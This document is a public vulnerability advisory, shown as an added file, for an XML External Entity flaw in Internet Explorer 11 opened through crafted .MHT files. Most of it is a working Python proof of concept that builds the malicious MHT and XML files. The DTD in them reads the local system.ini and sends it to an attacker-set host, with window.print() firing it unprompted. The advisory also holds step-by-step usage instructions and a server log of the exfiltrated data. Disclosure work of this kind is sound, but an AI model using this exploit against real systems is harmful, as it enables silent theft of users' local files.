@@ -1,0 +1,183 @@
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/MICROSOFT-INTERNET-EXPLORER-v11-XML-EXTERNAL-ENTITY-INJECTION-0DAY.txt
+[+] ISR: ApparitionSec          
+ 
+
+[Vendor]
+www.microsoft.com
+
+
+[Product]
+Microsoft Internet Explorer v11
+(latest version)
+
+Internet Explorer is a series of graphical web browsers developed by Microsoft and included in the Microsoft Windows line of operating systems, starting in 1995.
+
+
+[Vulnerability Type]
+XML External Entity Injection
+
+
+
+[CVE Reference]
+N/A
+
+
+
+[Security Issue]
+Internet Explorer is vulnerable to XML External Entity attack if a user opens a specially crafted .MHT file locally.
+
+This can allow remote attackers to potentially exfiltrate Local files and conduct remote reconnaissance on locally installed
+Program version information. Example, a request for "c:\Python27\NEWS.txt" can return version information for that program.
+
+Upon opening the malicious ".MHT" file locally it should launch Internet Explorer. Afterwards, user interactions like duplicate tab "Ctrl+K"
+and other interactions like right click "Print Preview" or "Print" commands on the web-page may also trigger the XXE vulnerability.
+
+However, a simple call to the window.print() Javascript function should do the trick without requiring any user interaction with the webpage.
+Importantly, if files are downloaded from the web in a compressed archive and opened using certain archive utilities MOTW may not work as advertised.
+
+Typically, when instantiating ActiveX Objects like "Microsoft.XMLHTTP" users will get a security warning bar in IE and be prompted
+to activate blocked content. However, when opening a specially crafted .MHT file using malicious <xml> markup tags the user will get no such
+active content or security bar warnings.
+
+e.g.
+
+C:\sec>python -m SimpleHTTPServer
+Serving HTTP on 0.0.0.0 port 8000 ...
+127.0.0.1 - - [10/Apr/2019 20:56:28] "GET /datatears.xml HTTP/1.1" 200 -
+127.0.0.1 - - [10/Apr/2019 20:56:28] "GET /?;%20for%2016-bit%20app%20support[386Enh]woafont=dosapp.fonEGA80WOA.FON=EGA80WOA.FONEGA40WOA.FON=EGA40WOA.FONCGA80WOA.FON=CGA80WOA.FONCGA40WOA.FON=CGA40WOA.FON[drivers]wave=mmdrv.dlltimer=timer.drv[mci] HTTP/1.1" 200 -
+
+
+Tested successfully in latest Internet Explorer Browser v11 with latest security patches on Win7/10 and Server 2012 R2.
+
+
+
+[POC/Video URL]
+https://www.youtube.com/watch?v=fbLNbCjgJeY
+
+
+
+[Exploit/POC]
+POC to exfil  Windows "system.ini" file.
+Note: Edit attacker server IP in the script to suit your needs.
+
+1) Use below script to create the "datatears.xml" XML and XXE embedded "msie-xxe-0day.mht" MHT file.
+
+2) python -m SimpleHTTPServer
+
+3) Place the generated "datatears.xml" in Python server web-root.
+
+4) Open the generated "msie-xxe-0day.mht" file, watch your files be exfiltrated.
+
+
+#Microsoft Internet Explorer XXE 0day
+#Creates malicious XXE .MHT and XML files
+#Open the MHT file in MSIE locally, should exfil system.ini
+#By hyp3rlinx 
+#ApparitionSec
+
+ATTACKER_IP="localhost"
+PORT="8000"
+
+mht_file=(
+'From:\n'
+'Subject:\n'
+'Date:\n'
+'MIME-Version: 1.0\n'
+'Content-Type: multipart/related; type="text/html";\n'
+'\tboundary="=_NextPart_SMP_1d4d45cf4e8b3ee_3ddb1153_00000001"\n'
+'This is a multi-part message in MIME format.\n\n\n'
+
+'--=_NextPart_SMP_1d4d45cf4e8b3ee_3ddb1153_00000001\n'
+'Content-Type: text/html; charset="UTF-8"\n'
+'Content-Location: main.htm\n\n'
+
+'<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/transitional.dtd">\n'
+'<html>\n'
+'<head>\n'
+'<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />\n'
+'<title>MSIE XXE 0day</title>\n'
+'</head>\n'
+'<body>\n'
+'<xml>\n'
+'<?xml version="1.0" encoding="utf-8"?>\n'
+'<!DOCTYPE r [\n'
+'<!ELEMENT r ANY >\n'
+'<!ENTITY % sp SYSTEM "http://'+str(ATTACKER_IP)+":"+PORT+'/datatears.xml">\n'
+'%sp;\n'
+'%param1;\n'
+']>\n'
+'<r>&exfil;</r>\n'
+'<r>&exfil;</r>\n'
+'<r>&exfil;</r>\n'
+'<r>&exfil;</r>\n'
+'</xml>\n'
+'<script>window.print();</script>\n'
+'<table cellpadding="0" cellspacing="0" border="0">\n'
+'<tr>\n'
+'<td class="contentcell-width">\n'
+'<h1>MSIE XML External Entity 0day PoC.</h1>\n'
+'<h3>Discovery: hyp3rlinx</h3>\n'
+'<h3>ApparitionSec</h3>\n'
+'</td>\n'
+'</tr>\n'
+'</table>\n'
+'</body>\n'
+'</html>\n\n\n'
+
+'--=_NextPart_SMP_1d4d45cf4e8b3ee_3ddb1153_00000001--'
+)
+
+xml_file=(
+'<!ENTITY % data SYSTEM "c:\windows\system.ini">\n'
+'<!ENTITY % param1 "<!ENTITY exfil SYSTEM \'http://'+str(ATTACKER_IP)+":"+PORT+'/?%data;\'>">\n'
+'<!ENTITY % data SYSTEM "file:///c:/windows/system.ini">\n'
+'<!ENTITY % param1 "<!ENTITY exfil SYSTEM \'http://'+str(ATTACKER_IP)+":"+PORT+'/?%data;\'>">\n'
+)
+
+def mk_msie_0day_filez(f,p):
+    f=open(f,"wb")
+    f.write(p)
+    f.close()
+
+
+if __name__ == "__main__":
+    mk_msie_0day_filez("msie-xxe-0day.mht",mht_file)
+    mk_msie_0day_filez("datatears.xml",xml_file)
+    print "Microsoft Internet Explorer XML External Entity 0day PoC."
+    print "Files msie-xxe-0day.mht and datatears.xml Created!."
+    print "Discovery: Hyp3rlinx / Apparition Security"
+
+    
+
+
+[Network Access]
+Remote
+
+
+
+[Severity]
+High
+
+
+
+[Disclosure Timeline]
+Vendor Notification: March 27, 2019
+Vendor acknowledgement: March 27, 2019 
+Case Opened: March 28, 2019
+MSRC reponse April 10, 2019: "We determined that a fix for this issue will be considered in a future version of this product or service.
+At this time, we will not be providing ongoing updates of the status of the fix for this issue, and we have closed this case."
+April 10, 2019 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
